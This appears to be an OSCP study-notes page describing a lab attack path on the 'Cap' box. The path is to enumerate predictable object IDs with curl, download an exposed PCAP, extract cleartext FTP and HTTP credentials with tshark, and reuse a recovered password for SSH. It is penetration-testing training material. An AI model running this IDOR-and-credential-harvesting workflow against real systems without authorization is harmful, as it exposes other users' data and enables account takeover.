# Linux - IDOR and PCAP Credential Recovery

**Step 5B of 50 · Linux/Web**

*Test predictable object references, preserve a downloadable capture, inspect it for cleartext authentication, and validate one recovered credential against the service suggested by the evidence.*

Fast syntax reference: [[OSCP COMMAND MASTER CHEATSHEET|OSCP Command Master Cheatsheet]] · This page is the decision path; keep captures and extracted authentication material in the private box workspace.

## When to use this page

Open this page when a custom dashboard, report page, data table, or download route contains a user-controlled numeric or otherwise predictable object identifier. The object may be a report, network capture, export, image, or document. A public page that loads one record is not proof of IDOR; compare neighbouring identifiers and record the response differences.

## Compare object references

Start with the smallest bounded comparison. Save both the headers and bodies so status, redirect, content type, length, and content can be compared later.

~~~bash
curl -i "http://$BoxIP/data/0"
curl -i "http://$BoxIP/data/1"

curl -sS -D "$BoxDir/loot/data-0.headers" \
  -o "$BoxDir/loot/data-0.html" \
  "http://$BoxIP/data/0"
curl -sS -D "$BoxDir/loot/data-1.headers" \
  -o "$BoxDir/loot/data-1.html" \
  "http://$BoxIP/data/1"

wc -c "$BoxDir/loot/data-0.html" "$BoxDir/loot/data-1.html"
grep -Ein 'download|pcap|capture|id=' "$BoxDir/loot/data-0.html" "$BoxDir/loot/data-1.html"
~~~

If the application requires a session, preserve the cookie and replay the same request with only the object identifier changed. Keep enumeration bounded; the goal is to prove the access-control decision, not to scrape the entire database.

> [!warning] 💡 A 200 response is only a lead
> Compare body length, content, redirects, timestamps, owner labels, and linked downloads. An empty template and another user's record can both return 200.

## Download the evidence artifact

Follow the download route found in the HTML or browser request. Use a private filename and preserve response headers separately.

~~~bash
boxset ObjectID 0

curl -sS -D "$BoxDir/loot/download-$ObjectID.headers" \
  -o "$BoxDir/loot/capture-$ObjectID.pcap" \
  "http://$BoxIP/download/$ObjectID"

file "$BoxDir/loot/capture-$ObjectID.pcap"
capinfos "$BoxDir/loot/capture-$ObjectID.pcap"
~~~

If the file is not a PCAP, do not force the packet-analysis branch. Inspect the content type and magic bytes, then route the artifact to the appropriate file or credential branch.

## Inspect the capture with tshark

List protocols before choosing a filter. Keep raw authentication output private: do not pipe it to the shared transcript, a screenshot, or a vault note.

~~~bash
tshark -r "$BoxDir/loot/capture-$ObjectID.pcap" \
  -q -z io,phs | tee "$BoxDir/loot/capture-$ObjectID.protocols.txt"

tshark -r "$BoxDir/loot/capture-$ObjectID.pcap" \
  -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
  -T fields -e frame.number -e ip.src -e ip.dst \
  -e ftp.request.command -e ftp.request.arg \
  > "$BoxDir/loot/capture-$ObjectID.ftp-auth.raw"
chmod 600 "$BoxDir/loot/capture-$ObjectID.ftp-auth.raw"

# Review the private file locally; do not print its contents into a shared log.
less "$BoxDir/loot/capture-$ObjectID.ftp-auth.raw"
~~~

Other useful protocol leads are HTTP Basic authentication, Telnet, and unencrypted application protocols:

~~~bash
tshark -r "$BoxDir/loot/capture-$ObjectID.pcap" \
  -Y 'http.authbasic || telnet || ftp' \
  -T fields -e frame.number -e tcp.stream -e ip.src -e ip.dst \
  > "$BoxDir/loot/capture-$ObjectID.auth-index.txt"
~~~

Extract the candidate username and password into the private loot area, then validate once against the service indicated by the capture. Do not spray a recovered password across unrelated accounts.

~~~bash
loot cred "$Username" "$Password"
ssh "$Username@$BoxIP"
id
whoami
hostname
~~~

## What did you get?

- [ ] Adjacent IDs return different records or one exposes another user's object → **Save the evidence and follow the download link**
- [ ] A downloadable PCAP is returned → **Run file, capinfos, and the protocol index above**
- [ ] FTP/Telnet/HTTP authentication fields are present → **Extract to mode-600 loot and validate one service credential**
- [ ] The PCAP is empty or malformed → **Recheck the ID, download headers, file length, and response body; then return to [[Linux - Web Enum]]**
- [ ] No cleartext authentication appears → **Inspect application protocol metadata and continue with [[Linux - Credential Search]] or the next service branch**
- [ ] The recovered credential fails once → **Record the negative result and return to evidence-based credential hunting; do not spray**

## Gotchas and evidence boundaries

- A live FTP login failure does not invalidate FTP traffic recovered from a capture. The services and time windows are different evidence sources.
- A 200 page can be empty, a default template, or a real record. Response size and body comparison matter.
- Test neighbouring IDs manually before writing a larger loop; use the smallest range that proves the missing ownership check.
- PCAPs can contain passwords, cookies, tokens, and internal addresses. Keep the original and extracted fields in private loot with restrictive permissions.
- Use capinfos and tshark before opening a GUI. The protocol tree tells you which display filters are worth running.
- Credential reuse is a hypothesis supported by evidence, not permission to spray. Validate the account and service suggested by the capture once.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- dashboard IDOR exposed a capture download; tshark recovered FTP authentication and the credential was reused for SSH

## Related stages

- [[Linux - Web Enum]]
- [[Linux - FTP Enumeration]]
- [[Linux - Credential Search]]
- [[Linux - Shell Stabilise]]
- [[Linux - Local Enum]]
- [[Linux - Clean Down]]

## External Resources

- [Wireshark Display Filter Reference](https://www.wireshark.org/docs/dfref/)
- [HackTricks - IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)
- [HackTricks - Sniffing and Credentials](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/sniffing/index.html)

## Why this matters for OSCP

This branch joins a subtle web authorization failure to offline evidence analysis. It rewards careful comparison and controlled validation, and it prevents a live-service negative result from hiding a stronger artifact-based lead.
